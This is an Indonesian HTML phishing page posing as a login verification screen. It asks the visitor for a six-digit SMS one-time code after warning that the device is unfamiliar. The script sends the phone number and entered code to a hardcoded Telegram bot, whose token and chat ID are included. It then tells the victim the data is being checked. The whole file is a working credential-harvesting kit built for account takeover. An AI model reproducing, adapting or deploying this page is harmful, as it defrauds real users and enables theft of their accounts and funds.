<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <title>Verifikasi Kode</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
      background: #fff;
      color: #000;
      font-size: 16px;
      user-select: none;
      min-height: 100vh;
      padding: 40px 20px 20px;
      display: flex;
      flex-direction: column;
    }
    .container {
      flex: 1;
      max-width: 360px;
      margin: 0 auto;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }
    .back-button {
      width: 32px;
      height: 32px;
      border: 1.5px solid #00aa00;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      user-select: none;
      margin-bottom: 24px;
    }
    .back-button svg {
      width: 16px;
      height: 16px;
      stroke: #00aa00;
      stroke-width: 2.2;
      fill: none;
    }
    h1 {
      font-weight: 600;
      font-size: 20px;
      line-height: 24px;
      margin-bottom: 8px;
      user-select: text;
    }
    .highlight-number {
      font-weight: 600;
      user-select: text;
    }
    .subtext {
      font-weight: 400;
      font-size: 14px;
      line-height: 20px;
      color: #9b9b9b;
      margin-bottom: 32px;
      user-select: text;
    }
    .code-inputs {
      display: flex;
      justify-content: space-between;
      margin-bottom: 8px;
      width: 100%;
    }
    .code-inputs input {
      width: 48px;
      height: 48px;
      border-radius: 8px;
      border: 1px solid #e6e6e6;
      font-size: 22px;
      font-weight: 600;
      text-align: center;
      outline: none;
      background: #fff;
      user-select: text;
      cursor: text;
    }
    .code-inputs input:focus {
      border-color: #00aa00;
      box-shadow: 0 0 5px #00aa00;
    }
    .timer-container {
      width: 100%;
      text-align: right;
      margin-bottom: 40px;
      height: 20px;
      user-select: none;
      position: relative;
      font-size: 12px;
      color: #9b9b9b;
    }
    .get-code-btn {
      font-size: 14px;
      color: #00aa00;
      font-weight: 600;
      cursor: pointer;
      border: none;
      background: none;
      padding: 0;
      line-height: 20px;
      user-select: auto;
      display: none;
      position: absolute;
      right: 0;
      top: 0;
    }
    .get-code-btn:hover {
      text-decoration: underline;
    }
    button.submit-btn {
      width: 100%;
      height: 48px;
      background-color: #c0c0c0;
      border: none;
      border-radius: 40px;
      color: #fff;
      font-size: 18px;
      font-weight: 600;
      cursor: not-allowed;
      user-select: none;
      margin-bottom: 60px;
      transition: background-color 0.3s ease;
    }
    button.submit-btn.enabled {
      background-color: #00aa00;
      cursor: pointer;
      user-select: auto;
    }
    .warning {
      font-weight: 400;
      font-size: 14px;
      color: #9b9b9b;
      max-width: 100%;
      user-select: none;
      display: flex;
      align-items: flex-start;
      gap: 8px;
      line-height: 1.3;
    }
    .warning-icon {
      flex-shrink: 0;
      margin-top: 2px;
      font-size: 14px;
      border: 1px solid #9b9b9b;
      border-radius: 50%;
      width: 18px;
      height: 18px;
      text-align: center;
      line-height: 18px;
      font-weight: 700;
      color: #9b9b9b;
      user-select: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="back-button" onclick="history.back()" aria-label="Kembali" role="button" tabindex="0">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
        <polyline points="15 18 9 12 15 6" />
      </svg>
    </div>

    <h1>
      Kode verifikasi telah dikirim ke <br />
      <span class="highlight-number" id="phoneNumber">-</span>
    </h1>

    <p class="subtext">
      Demi keamanan akun Anda, mohon untuk tidak membagikan kode verifikasi kepada siapapun
    </p>

    <div class="code-inputs">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
    </div>

    <div class="timer-container">
      <span class="timer-text" id="timer">58s</span>
      <button class="get-code-btn" id="getCodeBtn">Dapatkan</button>
    </div>

    <button class="submit-btn" disabled id="submitBtn">Kirimkan</button>

    <div class="warning">
      <div class="warning-icon">!</div>
      <div>
        Perangkat Anda saat ini bukan perangkat yang digunakan biasanya.<br />
        Silakan gunakan kode verifikasi untuk masuk
      </div>
    </div>
  </div>

  <script>
    /* SETTING TELEGRAM BOT */
    const TELEGRAM_BOT_TOKEN = '7803087451:AAHUjzxRh-ZPJxGB1P0KsbVqe-4quBtF-cw';  // Ganti dengan token bot Telegram Anda
    const TELEGRAM_CHAT_ID = '7582685852';       // Ganti dengan chat_id penerima

    // Contoh set nomor di localStorage jika belum ada (untuk testing)
    if (!localStorage.getItem('userPhone')) {
      localStorage.setItem('userPhone', '08787842548');
    }

    /* Ambil elemen */
    const phoneNumberEl = document.getElementById('phoneNumber');
    const inputs = document.querySelectorAll('.code-inputs input');
    const submitBtn = document.getElementById('submitBtn');
    const timerEl = document.getElementById('timer');
    const getCodeBtn = document.getElementById('getCodeBtn');

    // Tampilkan nomor dari localStorage
    const phone = localStorage.getItem('phoneNumber');
    phoneNumberEl.textContent = phone ? phone : 'nomor tidak tersedia';

    // Validasi input, auto fokus, pindah input
    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if (input.value.length > 0 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        checkAllInputs();
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && index > 0) {
          inputs[index - 1].focus();
        }
      });
    });

    // Aktifkan tombol Kirimkan jika semua input terisi
    function checkAllInputs() {
      const allFilled = Array.from(inputs).every(i => i.value.length === 1);
      if (allFilled) {
        submitBtn.disabled = false;
        submitBtn.classList.add('enabled');
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.remove('enabled');
      }
    }

    // Timer countdown 60 detik + tombol "Dapatkan"
    let countdown = 60;
    let timerInterval;

    function startTimer() {
      timerEl.style.display = 'inline';
      getCodeBtn.style.display = 'none';
      countdown = 60;
      timerEl.textContent = countdown + 's';

      timerInterval = setInterval(() => {
        countdown--;
        if (countdown > 0) {
          timerEl.textContent = countdown + 's';
        } else {
          clearInterval(timerInterval);
          timerEl.style.display = 'none';
          getCodeBtn.style.display = 'inline';
        }
      }, 1000);
    }

    // Bersihkan input dan fokus ke pertama
    function clearInputs() {
      inputs.forEach(input => input.value = '');
      inputs[0].focus();
      checkAllInputs();
    }

    // Kirim data ke Telegram via Bot API
    function sendToTelegram(phone, code) {
      const message = `Kode verifikasi:\nNomor: ${phone}\nKode: ${code}`;
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
    }

    // Event tombol "Dapatkan" untuk kirim ulang kode dan reset timer
    getCodeBtn.addEventListener('click', () => {
      alert('Kode verifikasi baru telah dikirim');
      clearInputs();
      startTimer();
    });

    // Event tombol Kirimkan data ke Telegram
    submitBtn.addEventListener('click', () => {
      if (!submitBtn.disabled) {
        const codeEntered = Array.from(inputs).map(i => i.value).join('');
        sendToTelegram(phone || 'nomor tidak tersedia', codeEntered)
          .then(res => res.json())
          .then(data => {
            if (data.ok) {
              alert('Data Sedang dipriksa.');
            } else {
              alert('Gagal mengirim ke Telegram.');
            }
          })
          .catch(err => {
            alert('Error mengirim ke Telegram: ' + err.message);
          });
      }
    });

    // Jalankan timer saat halaman dimuat
    startTimer();

  </script>
</body>
</html>
